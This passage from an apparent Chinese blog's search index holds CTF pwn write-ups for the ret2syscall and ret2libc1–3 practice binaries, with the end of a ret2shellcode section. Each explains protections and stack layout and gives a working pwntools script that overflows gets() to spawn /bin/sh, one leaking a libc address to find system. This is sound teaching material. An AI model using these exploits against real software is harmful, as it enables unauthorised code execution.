class="line">target=<span class="number">0x804A080</span><span class="comment">#buf2的地址</span></span><br><span class="line">shellcode=asm(shellcraft.sh())<span class="comment">#产生以一个最简单的执行system(&#x27;/bin/sh&#x27;)的shellcode 并进行汇编</span></span><br><span class="line"><span class="built_in">print</span>(p32(target))</span><br><span class="line">payload=shellcode.ljust(<span class="number">0xcf38</span>-<span class="number">0xcecc</span>+<span class="number">4</span>,<span class="string">&#x27;A&#x27;</span>)+p32(target)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a class="markdownIt-Anchor" href="#ret2syscall">#</a> ret2syscall</h2><p>先检查开启了哪些防护措施</p><p><img src="https://img-blog.csdnimg.cn/20190227225033419.png" alt="img"></p><p>开启了 NX 保护，所以无法在栈上直接执行代码。</p><p>使用 IDA 查看，仍然是 gets 函数导致的栈溢出。</p><p>使用系统调用来完成漏洞利用。</p><p><img src="https://img-blog.csdnimg.cn/20190227225149853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227225240795.png" alt="img"></p><p>找到 pop eax,ret，以同样的方法找到 ebx.ecx.edx 以及 int 80h 系统调用和 bin/sh</p><p><img src="https://img-blog.csdnimg.cn/20190227225941829.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227230001980.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227230010832.png" alt="img"></p><p>接下来要了解 payload 这样构成的原因，需要知道这三个指令</p><p><img src="https://img-blog.csdnimg.cn/20190227230150786.png" alt="img"></p><p>在堆栈里，我们知道 ebp+4 的地方为返回地址。这是因为 leave 时 esp=ebp+4,ret 将当前 esp 指向的值作为返回地址跳转并且 ESP+4。</p><p>所以构造 payload 为 payload = flat ([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</p><p>先用 112 个 A 填充，pop_eax_ret 为第一个返回地址，然后 ESP 指向 0xb, 以此类推。</p><p>写出 python 脚本，之前都解释过 不再注释了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">context.binary= <span class="string">&#x27;rop&#x27;</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x80be409</span></span><br><span class="line">int_0x80 = <span class="number">0x8049421</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc1"><a class="markdownIt-Anchor" href="#ret2libc1">#</a> ret2libc1</h2><p>给出 got 表 PLT 表 以及 libc 的相关解释，我觉得写的很清楚</p><p><a href="https://blog.csdn.net/Retrovich/article/details/82973086">https://blog.csdn.net/Retrovich/article/details/82973086</a></p><p>基本流程仍然相似，先检查保护</p><p><img src="https://img-blog.csdnimg.cn/20190228112803224.png" alt="img"></p><p>只打开了 NX</p><p>检查是否存在 /bin/sh</p><p><img src="https://img-blog.csdnimg.cn/20190228122346772.png" alt="img"></p><p>在 IDA 中查找 system 函数</p><p><img src="https://img-blog.csdnimg.cn/20190228113556749.png" alt="img"></p><p>查看到 ptl 处的 system 函数</p><p>写 Python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&#x27;ret2libc1&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh = <span class="number">0x8049720</span></span><br><span class="line">system = <span class="number">0x8048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+system+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+binsh])<span class="string">&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以&#x27;bbbb&#x27; 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc2"><a class="markdownIt-Anchor" href="#ret2libc2">#</a> ret2libc2</h2><p>这里仍然用相同的流程，唯一不同的是没有直接给出 /bin/sh, 需要先调用 gets 函数再利用 pop ret 调用 system 函数</p><p><img src="https://img-blog.csdnimg.cn/20190228160834983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>直接给出 python 的脚本，与上一个例子相同，整体不再多赘述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>我给出了堆栈溢出的 ESP 指向流程图，顺着思考容易看懂 payload</p><p><img src="https://img-blog.csdnimg.cn/20190228160353314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><h2 id="ret2libc3"><a class="markdownIt-Anchor" href="#ret2libc3">#</a> ret2libc3</h2><p><img src="https://img-blog.csdnimg.cn/20190228171912573.png" alt="img"></p><p>检查安全保护，只开启了 NX</p><p><img src="https://img-blog.csdnimg.cn/20190228195219362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>IDA 里查看，仍然是 gets 函数的堆栈溢出。</p><p>但是这里没有给 system 函数</p><p>也没有给定的 /bin/sh</p><p>所以需要我们从 libc 中调用 system 函数</p><p><img src="https://img-blog.csdnimg.cn/20190228195812530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>根据这个知识点</p><p>写 exp, 涉及新的东西我仍然全部做注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;ret2libc3&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;ret2libc3&#x27;</span>) <span class="comment">#静态加载ELF文件</span></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment">#获取指定文件的plt条目</span></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>] <span class="comment">#获取指定文件的got条目</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;_start&#x27;</span>] <span class="comment">#获取指定文件的函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak main_got addr and return main&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>,puts_plt,main,libc_start_main_got]) <span class="comment">#先使用plts_plt函数打印出main函数的在got表中的真实地址</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>]) <span class="comment">#获取main函数的真实地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main_addr) <span class="comment">#获取libc</span></span><br><span class="line">libcbase = libc_start_main_addr-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>) <span class="comment">#获取libc基地址</span></span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>) <span class="comment">#获取system地址</span></span><br><span class="line">binsh_addr = libcbase +libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment">#获取binsh字符串地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;now get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>,system_addr,<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>,binsh_addr]) <span class="comment">#这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
